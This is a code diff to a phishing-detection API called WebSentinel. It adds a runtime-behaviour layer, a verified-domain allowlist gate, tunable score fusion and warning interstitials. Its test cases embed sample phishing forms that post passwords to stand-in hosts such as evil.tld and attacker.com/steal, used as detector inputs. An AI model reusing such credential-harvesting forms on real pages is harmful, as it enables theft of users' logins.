@@ -32,9 +32,38 @@ from .c1.crx_utils import (
 # ── C2 — Browser-in-the-Browser Phishing Detector ─────────────────────────────
 from .c2.layer1_bitb       import check_bitb
 from .c2.layer2_url        import check_url
-from .c2.layer3_visual     import check_visual
+from .c2.layer3_visual     import check_visual, HAS_HASHES as _L3_HAS_HASHES
 from .c2.layer4_form       import check_form
-from .c2.layer5_reputation import check_reputation
+from .c2.layer5_reputation import check_reputation, aclose as _reputation_aclose
+from .c2.layer6_runtime    import check_runtime
+from .c2.verified_domains  import is_verified
+
+# ── C2 fusion: configurable weights + optional learned meta-classifier ─────────
+_FUSION_ORDER    = ["L1", "L2", "L3", "L4", "L5", "L6"]
+_DEFAULT_WEIGHTS = {"L1": 0.15, "L2": 0.25, "L3": 0.15, "L4": 0.10, "L5": 0.20, "L6": 0.15}
+_fusion_model = None
+_FUSION_PATH  = os.path.join(_REPO_ROOT, "models", "c2_fusion.pkl")
+try:
+    import pickle as _pickle
+    with open(_FUSION_PATH, "rb") as _ff:
+        _fusion_model = _pickle.load(_ff)
+    print("[C2-fusion] Loaded learned fusion meta-classifier")
+except FileNotFoundError:
+    print("[C2-fusion] No c2_fusion.pkl — using weighted-sum fusion")
+
+
+def _fuse_score(layer_results: list, weights: dict) -> float:
+    """Fused risk 0–100. Uses the learned meta-classifier when present and all six
+    layers ran; otherwise a configurable weighted sum over whatever layers ran."""
+    scores = {lr["id"]: float(lr["score"]) for lr in layer_results}
+    if _fusion_model is not None and all(k in scores for k in _FUSION_ORDER):
+        try:
+            import pandas as pd
+            X = pd.DataFrame([[scores[k] for k in _FUSION_ORDER]], columns=_FUSION_ORDER)
+            return float(_fusion_model.predict_proba(X)[0][1]) * 100
+        except Exception:
+            pass
+    return sum(s * weights.get(lid, 0.0) for lid, s in scores.items()) * 100
 
 # ── C3 — Browser Execution-Aware C2 Beacon Detector ───────────────────────────
 from .c3.context_tagger import c3_tagger
@@ -68,12 +97,14 @@ async def lifespan(app):
     pw_session.clear_callbacks()
     pw_session.add_nav_callback(_pw_nav_handler)
     pw_session.add_click_callback(_on_extension_install_click)
+    pw_session.add_close_callback(_pw_tab_closed)
     asyncio.create_task(_bg_start_session())
     yield
     # Graceful shutdown
     await c3_analyzer.stop_loop()
     await c3_interceptor.stop()
     await pw_session.stop()
+    await _reputation_aclose()
 
 app = FastAPI(title="WebSentinel API", version="4.0.0", lifespan=lifespan)
 
@@ -89,13 +120,15 @@ _ws_clients: Set[WebSocket] = set()
 _session_starting = False
 
 async def _broadcast(data: dict) -> None:
-    dead: Set[WebSocket] = set()
-    for ws in list(_ws_clients):
-        try:
-            await ws.send_json(data)
-        except Exception:
-            dead.add(ws)
-    _ws_clients.difference_update(dead)
+    clients = list(_ws_clients)
+    if not clients:
+        return
+    # Send to all clients concurrently so one slow/stuck client can't delay the others.
+    results = await asyncio.gather(*(ws.send_json(data) for ws in clients),
+                                   return_exceptions=True)
+    dead = {ws for ws, r in zip(clients, results) if isinstance(r, Exception)}
+    if dead:
+        _ws_clients.difference_update(dead)
 
 # ── Analyzing page shown in the Playwright browser while C1 scans an extension ─
 _ANALYZING_HTML = """\
@@ -142,10 +175,18 @@ _pending_installs: dict = {}
 _SETTINGS_FILE = os.path.join(os.path.dirname(__file__), "settings.json")
 
 _SETTINGS_DEFAULTS: dict = {
-    "layers": {"l1": True, "l2": True, "l3": True, "l4": True, "l5": True},
+    "layers": {"l1": True, "l2": True, "l3": True, "l4": True, "l5": True, "l6": True},
     "whitelist": [],
     "gsb_key": "",
     "pw_home_url": "",
+    "warn_threshold": 30,            # risk_score >= this -> warning banner
+    "block_threshold": 60,           # risk_score >= this -> blocking interstitial
+    "interstitial_enabled": True,    # show in-browser warning/block overlays
+    "weights": dict(_DEFAULT_WEIGHTS),  # fusion weights (overwritten by tune_fusion)
+    "verdict_suspicious": 30,        # risk_score >= this -> SUSPICIOUS
+    "verdict_phishing": 60,          # risk_score >= this -> PHISHING
+    "runtime_active_probe": False,   # L6: actively probe password field for keyloggers
+    "phishtank_enabled": True,       # L5: query the PhishTank public feed (off = GSB only)
 }
 
 def _load_settings() -> dict:
@@ -172,12 +213,20 @@ class AnalyzeReq(BaseModel):
     url: str
     dom: Optional[str] = None
     screenshot: Optional[str] = None
+    runtime: Optional[dict] = None
 
 class SettingsReq(BaseModel):
     layers: dict
     whitelist: List[str] = []
     gsb_key: str = ""
     pw_home_url: str = ""
+    warn_threshold: int = 30
+    block_threshold: int = 60
+    interstitial_enabled: bool = True
+    weights: Optional[dict] = None
+    verdict_suspicious: int = 30
+    verdict_phishing: int = 60
+    runtime_active_probe: bool = False
 
 class ExtensionAnalyzeReq(BaseModel):
     manifest: str
@@ -236,28 +285,61 @@ async def analyze(req: AnalyzeReq):
                     "layers": [], "timestamp": datetime.now().isoformat()}
 
     ly = settings["layers"]
-    layer_results = []
-    weights = {"L1": 0.15, "L2": 0.30, "L3": 0.20, "L4": 0.15, "L5": 0.20}
 
+    # ── Verified-domain trust gate ────────────────────────────────────────────
+    # Known-good sites (Tranco allowlist, eTLD+1 match, shared hosts excluded) skip
+    # the FP-prone heuristic layers but still get a reputation check, so a
+    # compromised-but-listed domain can still be flagged as PHISHING.
+    if is_verified(url):
+        if ly.get("l5", True):
+            rep = await check_reputation(url, settings["gsb_key"],
+                                         settings.get("phishtank_enabled", True))
+        else:
+            rep = {"score": 0.0, "flagged": False, "detail": "L5 disabled"}
+        if rep.get("flagged"):
+            risk_score = round(min(100.0, float(rep["score"]) * 100), 1)
+            result = {"url": url, "verdict": "PHISHING", "risk_score": risk_score,
+                      "layers": [{"id": "L5", "name": "Reputation Check",
+                                  "score": round(float(rep["score"]), 4),
+                                  "detail": rep.get("detail", "")}],
+                      "verified": True,
+                      "timestamp": datetime.now().isoformat()}
+        else:
+            result = {"url": url, "verdict": "VERIFIED", "risk_score": 0.0,
+                      "layers": [], "verified": True,
+                      "timestamp": datetime.now().isoformat()}
+        alerts.insert(0, result)
+        if len(alerts) > 500:
+            alerts.pop()
+        return result
+
+    layer_results = []
+    weights = settings.get("weights") or _DEFAULT_WEIGHTS
+
+    pt_enabled = settings.get("phishtank_enabled", True)
     layer_jobs = []
     if ly.get("l1", True): layer_jobs.append(("L1", "BitB Detection",    check_bitb(url, req.dom or "")))
     if ly.get("l2", True): layer_jobs.append(("L2", "URL Analysis",      check_url(url)))
     if ly.get("l3", True): layer_jobs.append(("L3", "Visual Similarity", check_visual(url, req.screenshot or "")))
     if ly.get("l4", True): layer_jobs.append(("L4", "Form Destination",  check_form(url, req.dom or "")))
-    if ly.get("l5", True): layer_jobs.append(("L5", "Reputation Check",  check_reputation(url, settings["gsb_key"])))
+    if ly.get("l5", True): layer_jobs.append(("L5", "Reputation Check",  check_reputation(url, settings["gsb_key"], pt_enabled)))
+    if ly.get("l6", True): layer_jobs.append(("L6", "Runtime Behavior",  check_runtime(url, req.runtime)))
 
-    for lid, lname, coro in layer_jobs:
-        try:
-            res = await coro
+    # Run all layers concurrently: CPU layers (L1/L2/L3) run in worker threads while the
+    # L5 network lookup overlaps — order is preserved from layer_jobs for the result rows.
+    outcomes = await asyncio.gather(*(coro for _, _, coro in layer_jobs), return_exceptions=True)
+    for (lid, lname, _), res in zip(layer_jobs, outcomes):
+        if isinstance(res, Exception):
+            layer_results.append({"id": lid, "name": lname, "score": 0.0, "detail": f"Error: {res}"})
+        else:
             layer_results.append({"id": lid, "name": lname,
                                    "score": round(float(res["score"]), 4),
                                    "detail": res.get("detail", "")})
-        except Exception as e:
-            layer_results.append({"id": lid, "name": lname, "score": 0.0, "detail": f"Error: {e}"})
 
-    risk_score = sum(lr["score"] * weights.get(lr["id"], 0.2) * 100 for lr in layer_results)
-    risk_score = round(min(100.0, max(0.0, risk_score)), 1)
-    verdict = "PHISHING" if risk_score >= 60 else "SUSPICIOUS" if risk_score >= 30 else "SAFE"
+    risk_score = round(min(100.0, max(0.0, _fuse_score(layer_results, weights))), 1)
+    t_phish = settings.get("verdict_phishing", 60)
+    t_susp  = settings.get("verdict_suspicious", 30)
+    verdict = "PHISHING" if risk_score >= t_phish else "SUSPICIOUS" if risk_score >= t_susp else "SAFE"
 
     result = {"url": url, "verdict": verdict, "risk_score": risk_score,
               "layers": layer_results, "timestamp": datetime.now().isoformat()}
@@ -275,7 +357,15 @@ async def get_alerts(limit: int = 50):
 @app.post("/settings")
 async def save_settings(req: SettingsReq):
     settings.update({"layers": req.layers, "whitelist": req.whitelist,
-                      "gsb_key": req.gsb_key, "pw_home_url": req.pw_home_url})
+                      "gsb_key": req.gsb_key, "pw_home_url": req.pw_home_url,
+                      "warn_threshold": req.warn_threshold,
+                      "block_threshold": req.block_threshold,
+                      "interstitial_enabled": req.interstitial_enabled,
+                      "verdict_suspicious": req.verdict_suspicious,
+                      "verdict_phishing": req.verdict_phishing,
+                      "runtime_active_probe": req.runtime_active_probe})
+    if req.weights:
+        settings["weights"] = req.weights
     _save_settings(settings)
     return {"status": "saved"}
 
@@ -716,6 +806,22 @@ async def _tc_c2_url_benign():
     assert score_data["score"] < 0.8, f"Benign URL scored too high: {score_data['score']}"
     return {"detail": f"google.com → score={score_data['score']:.3f} (below 0.80 threshold)"}
 
+async def _tc_c2_verified_domain():
+    """Verified-domain trust gate: a Tranco-listed site is VERIFIED (no false positive),
+    while a phishing page on a free-hosting subdomain is NOT trusted."""
+    # google.com served with markup that normally trips L1 heuristics.
+    noisy_dom = ('<html><body style="position:fixed;user-select:none">'
+                 '<div style="z-index:99999"></div></body></html>')
+    g = await analyze(AnalyzeReq(url="https://www.google.com/search?q=python", dom=noisy_dom))
+    assert g["verdict"] == "VERIFIED", f"google.com expected VERIFIED, got {g['verdict']} ({g['risk_score']})"
+    assert g["risk_score"] == 0.0, f"google.com risk should be 0, got {g['risk_score']}"
+    # Free-host subdomain must bypass verification and be scanned normally.
+    y = await analyze(AnalyzeReq(url="http://paypal-login.yolasite.com/x",
+                                 dom='<html><body><form action="http://evil.tld/x">'
+                                     '<input type=password></form></body></html>'))
+    assert y["verdict"] != "VERIFIED", f"yolasite subdomain wrongly VERIFIED ({y['risk_score']})"
+    return {"detail": f"google.com → VERIFIED (risk 0); paypal-login.yolasite.com → {y['verdict']} (risk {y['risk_score']})"}
+
 async def _tc_c2_form_offsite():
     dom = """<html><body><form action="https://attacker.com/steal" method="POST">
     <input type="password" name="pass"/></form></body></html>"""
@@ -883,6 +989,7 @@ _ALL_TEST_CASES = [
     {"id":"c1_entropy",   "component":"c1","label":"Shannon entropy: obfuscated > clean",      "fn":_tc_c1_entropy},
     {"id":"c2_url_phish", "component":"c2","label":"URL: paypal-secure-login.yolasite.com flagged","fn":_tc_c2_url_phishing},
     {"id":"c2_url_clean", "component":"c2","label":"URL: google.com scores below threshold",  "fn":_tc_c2_url_benign},
+    {"id":"c2_verified",  "component":"c2","label":"Verified domain: google.com → VERIFIED, free-host phish not trusted","fn":_tc_c2_verified_domain},
     {"id":"c2_form_off",  "component":"c2","label":"Form: off-domain POST → score > 0.5",     "fn":_tc_c2_form_offsite},
     {"id":"c2_form_same", "component":"c2","label":"Form: same-domain POST → score = 0",      "fn":_tc_c2_form_samedomain},
     {"id":"c2_browser_phish","component":"c2","label":"[Browser] BitB phishing page → detected live","fn":_tc_c2_browser_phish,"browser":True},
@@ -1202,15 +1309,63 @@ async def forensic_report_siem():
 #  Playwright session endpoints (shared by all components)
 # ══════════════════════════════════════════════════════════════════════════════
 
+def _needs_full_capture(url: str) -> bool:
+    """False when analyze() will short-circuit (SKIP / whitelist / verified) and won't use
+    the DOM/screenshot/runtime — lets the nav handler skip costly capture. Mirrors the
+    early-return conditions in analyze()."""
+    for prefix in ("about:", "chrome:", "devtools:", "electron:"):
+        if url.startswith(prefix):
+            return False
+    u = url.lower()
+    for d in settings["whitelist"]:
+        if d and d.lower() in u:
+            return False
+    return not is_verified(url)
+
+
 async def _pw_nav_handler(url: str, page=None) -> None:
-    """C2 phishing analysis on every navigation. C1 runs on click, not navigation."""
-    dom        = await pw_session.get_dom()
-    screenshot = await pw_session.get_screenshot_b64()
-    title      = await pw_session.get_title()
-    req        = AnalyzeReq(url=url, dom=dom, screenshot=screenshot)
+    """C2 phishing analysis on every navigation. C1 runs on click, not navigation.
+    Reads from the specific `page` that navigated so each tab is analyzed independently."""
+    # Skip the expensive captures for URLs analyze() will short-circuit (skip/whitelist/
+    # verified); for the rest, only screenshot when L3 can actually use it.
+    if _needs_full_capture(url):
+        dom = await pw_session.get_dom(page)
+        if _L3_HAS_HASHES and settings.get("layers", {}).get("l3", True):
+            screenshot = await pw_session.get_screenshot_b64(page)
+        else:
+            screenshot = ""
+        runtime = await pw_session.get_runtime_signals(
+            active_probe=settings.get("runtime_active_probe", False), page=page)
+    else:
+        dom, screenshot, runtime = "", "", {}
+    title      = await pw_session.get_title(page)
+    req        = AnalyzeReq(url=url, dom=dom, screenshot=screenshot, runtime=runtime)
     result     = await analyze(req)
+    # If the tab was closed while this analysis was in flight, don't emit a stale card.
+    if page is not None:
+        try:
+            if page.is_closed():
+                return
+        except Exception:
+            pass
+        result["tab_id"] = pw_session.tab_id(page)
+        result["title"]  = title
     await _broadcast({"type": "analysis",   "data": result})
     await _broadcast({"type": "url_change", "url": url, "title": title})
+
+    # Threshold-driven in-browser interstitial (warning / blocking + continue) — on the
+    # tab that navigated, so it never leaks onto another tab.
+    if settings.get("interstitial_enabled", True):
+        score = result.get("risk_score", 0)
+        if score >= settings.get("block_threshold", 60):
+            await pw_session.inject_interstitial("block", result, page=page)
+        elif score >= settings.get("warn_threshold", 30):
+            await pw_session.inject_interstitial("warn", result, page=page)
+
+
+async def _pw_tab_closed(tab_id: int) -> None:
+    """Tell the dashboard to drop a tab's live card when its browser tab closes."""
+    await _broadcast({"type": "tab_closed", "tab_id": tab_id})
 
 
 async def _bg_start_session() -> None:
@@ -1253,6 +1408,7 @@ async def session_start():
     pw_session.clear_callbacks()
     pw_session.add_nav_callback(_pw_nav_handler)
     pw_session.add_click_callback(_on_extension_install_click)
+    pw_session.add_close_callback(_pw_tab_closed)
     asyncio.create_task(_bg_start_session())
     return {"status": "starting"}
 
